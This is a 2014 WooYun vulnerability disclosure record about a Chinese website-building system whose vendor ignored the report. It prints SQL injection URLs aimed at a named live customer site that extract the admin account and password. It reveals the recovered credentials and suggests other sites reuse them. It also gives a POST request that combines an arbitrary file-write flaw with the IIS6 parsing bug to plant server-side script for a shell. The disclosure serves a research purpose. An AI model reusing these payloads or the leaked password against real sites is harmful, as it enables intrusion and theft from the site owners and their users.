{"id": 2106, "wybug_id": "wooyun-2014-061130", "wybug_title": "中普网建站系统多个漏洞导致多家企业沦陷", "wybug_corp": "中普网", "wybug_author": "Gavin", "wybug_date": "2014-05-17 17:52", "wybug_open_date": "2014-08-15 17:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-17：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-08-15：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 很多电影院和企业采用这套建站系统，存在多个漏洞，可获取shell。 详细说明：  0x00:中普网（http://www.chinapoo.cn/）的这套系统是不公开下载的，但是由于某个子站管理不当，管理员将网站程序打包放到网站目录下，被我下载了一套，之前为cncert提供过一次这个建站系统的多个漏洞，最近又分析了一下代码，之前的漏洞已经修补了，但仍然发现存在很多漏洞，由于上次拿了官网的shell，目前官网用了IIS防护软件，所以不好拿来演示，但是官网有一个栏目展示他们的很多作品（客户网站），很贴心，我们随便挑一个来演示吧。http://www.chinapoo.cn/info/listinfo.dll?infoid=218\n\n本次演示我们就拿其中一个商城来演示：http://www.xinfangsheng.com/PS：脚本后缀都为dll，其实就是asp。0x01，SQL注入漏洞，这次又发现另外一处注入。/sub/link.dll\nver=request(\"ver\")if ver=\"\" thenver=\"cn\"end ifsss=sss&\"<table width=100% border=0 align=center>\"set rs=conn.execute(\"select name,url,pic from link where s=0 and ver='\"&ver&\"' order by px,id desc\")if not rs.eof thenx=1do until rs.eofname=trim(prox.makeshtml3(rs(\"name\")))nx=name\n利用代码：http://www.xinfangsheng.com/sub/link.dll?ver=1%27/**/and/**/%28select/**/top/**/1/**/ausn/**/from/**/uadmin%29=1--\n\nhttp://www.xinfangsheng.com/sub/link.dll?ver=1%27/**/and/**/%28select/**/top/**/1/**/apwd/**/from/**/uadmin%29=1--\n\n0x02，解密密码：通过注入拿到帐号和密码了，但是这个密码并不是常规加密，是网站自己写的一个加密算法，只要找到他的加密函数，调用即可。\n\n因此获取出来的帐号和密码为Chinapoo/Chinapoo其实也算得上是弱口令了...我猜测其它的站没准也会用这个口令...0x03，后台篇:后他的地址也比较好猜（将常见的字典后缀改为.dll扫一下即可）http://www.xinfangsheng.com/admin/manage.dll\n\n进入后台以后，通过常见的一些上传绕过无法成功。只能通过代码继续深入...0x04，任意写文件-getshell:Admin/admin/spower.dll\n<%id=request(\"id\")if id=\"\" or not isnumeric(id) thencall prox.smsg(\"参数错误!\",\"\")response.endend ifstp=request(\"stp\")if stp=\"i\" thenbn=\"isort\"elsebn=\"psort\"end ifver=request(\"ver\")if ver=\"\" thenver=\"cn\"end ifif request.ServerVariables(\"HTTP_METHOD\")=\"POST\" thenapower=request(\"hid\")if apower<>\"\" thenapower=replace(apower,\", \",\",\")end ifcall creatfile(\"/admin/admin/pow/\",stp&id&\".inc\",apower)call prox.smsg(\"操作成功!\",\"\")end if%>\n因为采用asp开发，很多站都用的IIS6，官网也是一样。结合IIS6解析漏洞来getshell。必须使用POST发送，并且要修改Referer：http://www.xinfangsheng.com/Admin/admin/spower.dllid=11&stp=c.dll;&hid=%3c%25response.write(%22Test%20By%20Gavin%22)%25%3e\n\n\n\n\n\n   漏洞证明：  \n\n   修复方案：  略   版权声明：转载请注明来源 Gavin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-05-24 15:21 |    \t\tLonely \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:27        | 人生如梦,始终都游不过当局者迷的悲哀。)\t\t \n  这是 诈尸 ， 吗。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}